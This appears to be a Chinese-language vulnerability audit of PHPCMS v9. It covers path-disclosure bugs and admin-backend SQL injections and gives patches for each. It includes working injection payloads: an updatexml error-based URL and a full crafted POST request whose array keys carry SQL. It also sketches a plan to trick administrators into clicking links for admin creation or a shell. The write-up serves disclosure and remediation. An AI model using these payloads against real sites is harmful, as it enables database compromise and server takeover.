### 0x01 测试场景：
  1. 版本信息截图如下：
### 0x02 测试思路：
检测者通过投稿的方式或者其他可能的方式递送存在漏洞的链接，一旦后台用户点击，就会自动添加一个新的管理员（该项需要管理权权限，后台其他重要操作等）或者在一定条件下直接Getshell。接下来分说几个漏洞点，最后进行漏洞复现。
### 0x03 文件报错
这种类型的洞在phpcms中还挺常见的，主要是没有处理好一些包含，单独挖这种洞实际上意义也不大，但是如果要getshell的话却缺一不可，简单列举几种类型。
**1.1 漏洞文件：**
> \phpcms\modules\content\sitemodel_field.php的edit方法中
因为根本没有初始化`$field_type`的值就进行了包含（前面有个if判断， **进到逻辑中才进行赋值，否则不赋值** ）
直接请求/index.php?m=content&c=sitemodel_field&a=edit&modelid=&menuid=&pc_hash=xxxxx
即可爆路径
**修复方案：**
修改\phpcms\modules\content\sitemodel_field.php第124行为：
    if(is_file(MODEL_PATH.$formtype.DIRECTORY_SEPARATOR.'config.inc.php')) require (MODEL_PATH.$formtype.DIRECTORY_SEPARATOR.'config.inc.php');
**修改前后对比：**
修改后已无法爆路径。
**1.2 漏洞文件：**
> \phpcms\modules\formguide\formguide_field.php
变量直接进行包含，可爆路径链接：
> /index.php?m=formguide&c=formguide_field&a=public_field_setting
**修复方案：**
修改\phpcms\modules\formguide\formguide_field.php第300行为
    if(is_file(MODEL_PATH.$fieldtype.DIRECTORY_SEPARATOR.'config.inc.php')) require (MODEL_PATH.$fieldtype.DIRECTORY_SEPARATOR.'config.inc.php');
**修改前后对比：**
修改后已无法爆路径
**1.3 漏洞文件：**
> /caches/configs/system.php
因为没有判断引入关系，导致该文件可以直接被访问，只有正确引用该文件的情况下，文件中的变量才能被 **正确定义**
，于是直接访问就会导致变量出现问题，直接爆路径链接地址如图
> /cache/configs/system.php
**修复方案：**
在/caches/configs/system.php头部添加
    defined('IN_PHPCMS') or exit('No permission resources.');
**修改前后对比图：**
修改后已无法爆路径
### 0x04 后台“鸡肋”注入
Phpcms默认全局会对传递的`$_GET`,`$_POST`等参数值进行addslashes转义处理，再加上变量大部分都会被单引号包裹，很多数值参数也是直接int处理，所以要找到注入还是比较难的。这次的审计中，前台没有再找到注入（之前parse_str函数出过注入），后台倒是找到了一些，不过由于phpcms的密码加密方式，单独的后台注入并没有什么作用，但是如果在当前数据库用户有写权限，并且知道路径的情况下，那就可以直接into
outfile从而getshell了。接下来介绍3种类型的注入.
**4.1 变量没有处理直接进入数据库查询**
> \phpcms\modules\poster\poster.php
在stat函数中
第222行获取变量`$group`的值，没有加单引号，加了`
第226行进入get_one函数，在该函数中
第80行进入db_mysqli.class.php的get_one函数
全程都没有对`$group`的值进行过滤处理，于是产生注入，请求地址如下：
>
> /index.php?m=poster&c=poster&a=stat&pc_hash=xxxxx&id=1&click=1&group=type`%20ORDER%20BY%20(select%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1)))%23
数据库执行语句为:
    SELECT COUNT(*) AS num FROM `phpcmsv9`.`v9_poster_201707` WHERE `pid`='1' AND `siteid`='1' AND `type`='1' GROUP BY `type` ORDER BY (select 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)))#` LIMIT 1
这里因为addslashes函数的处理，是没办法引入单双引号，所以没办法into outfile
修复方案：
修改\phpcms\modules\poster\poster.php
第222,223行为
    if(in_array($_GET['group'],array('username','area','ip','referer','clicktime','type')))
    {
        $group = " `".$_GET['group']."`";
        $fields = "*, COUNT(".$_GET['group'].") AS num";
        $order = " `num` DESC";
    }
    else
    {
        $group = " `type`";
        $fields = "*, COUNT(type) AS num";
        $order = " `num` DESC";
    }
修改前后对比图：
修改后已无法注入
**4.2 数据库查询直接传入数组导致的注入**
> \phpcms\modules\content\sitemodel_field.php
在add函数中
第51行直接传入`$_POST['info']`数组，也即意味着我们不仅可以控制数组的值，还可以控制键值。
调用\phpcms\libs\classes\model.class.php的insert方法
调用\phpcms\libs\classes\db_mysqli.class.php的insert方法
第193行，对数组的键值调用add_special_char方法进行处理
该函数对值添加`字符作为字段，并且检验是否包含一些特定的关键字，不过用替换为空处理着实不明智。
所以这个函数基本上没有做任何防护处理
第201行调用execute方法执行最后的数据库操作语句
综上，我们可以控制`$_POST['info']`的键来进行注入
测试过程：
在后台：
> 内容 > 内容相关设置 > 模型管理 >
选择一个模型进行字段管理，然后点击添加字段，填写数据后抓包
    POST /index.php?m=content&c=sitemodel_field&a=add HTTP/1.1
    Host: 192.168.99.127
    Content-Length: 856
    Cache-Control: max-age=0
    Origin: http://192.168.99.127
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    DNT: 1
    Referer: http://192.168.99.127/index.php?m=content&c=sitemodel_field&a=add&modelid=12&menuid=59&pc_hash=hvTown
    Accept-Language: en,zh-CN;q=0.8,zh;q=0.6
    Cookie: 
    Connection: close
    info[formtype]=text&issystem=0&info[issystem]=0&info[field]=heiheihei9&info[name]=heiheiheihei&info[tips]=&setting[size]=50&setting[defaultvalue]=&setting[ispassword]=0&info[formattribute]=&info[css]=&info[minlength]=0&info[maxlength]=&info[pattern]=&pattern_select=&info[errortips]=&info[isunique]=0&info[isbase]=1&info[issearch]=0&info[isadd]=1&info[isfulltext]=1&info[isomnipotent]=0&info[isposition]=0&info[modelid]=12&dosubmit=%CC%E1%BD%BB&pc_hash=hvTown&info[`test`,`setting`,`siteid`,`unsetgroupids`,`unsetroleids`) VALUES ('text','0','heiheihei3','heiheiheihei'or updatexml(1,concat(0x7e,(version())),0) or'','','','','0','','','','0','1','0','1','1','0','0','12','1234\'','{\"size\":\"50\",\"defaultvalue\":\"\",\"ispassword\":\"0\"}','1','','')%23]=1234
在info数组中添加一个数据，键为数据库注入语句
每查询一次就要 **修改一次**
info[field]的值，否则数据库会爆字段重复错误。这里因为addslashes函数的处理，是没办法引入单双引号，所以没办法into outfile
**修复建议：**
指定传入insert的键值或者限定`$_POST['info']`数组中的键为固定数组中的一个,修改\phpcms\modules\content\sitemodel_field.php第51行为
    $this->db->insert(array('modelid'=>$modelid,'field'=>$field, 'minlength'=>$minlength, 'maxlength'=>$maxlength, 'formtype'=>$field_type, 'setting'=>$_POST['info']['setting'], 'siteid'=>$_POST['info']['siteid'], 'unsetgroupids'=>$_POST['info']['unsetgroupids'],'unsetroleids'=>$_POST['info']))
或者在第50行后添加
    $fields = array('modelid', 'field', 'minlength', 'maxlength','formtype','setting','siteid','unsetgroupids','unsetroleids');
    foreach ($_POST['info'] as $k=>$value) 
    {
        if (!in_array($k, $fields))
    {
            unset($_POST['info'][$k]);
        }
    }
这里选择后者，便于管理与操作
修改后对比图：
修改后已无法进行注入。
其他：在edit函数中
也是同样直接传入`$_POST['info']`数组，也即意味着我们不仅可以控制数组的值，还可以控制键值，最后造成update型注入，这里不再赘述。修复方法同上。
像\phpcms\modules\content\sitemodel_field.php文件一样因为直接传入数组查询导致注入的还有以下文件，这里只列举，不再赘述：
> \phpcms\modules\content\type_manage.php
>
> add方法insert注入
>
> \phpcms\modules\content\workflow.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\formguide\formguide.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\member\member.php
>
> add方法insert注入
>
> \phpcms\modules\member\member_menu.php
>
> add方法insert注入/edit方法update型注入
>
> \phpcms\modules\member\member_modelfield.php
>
> add方法insert注入/edit方法update型注入
>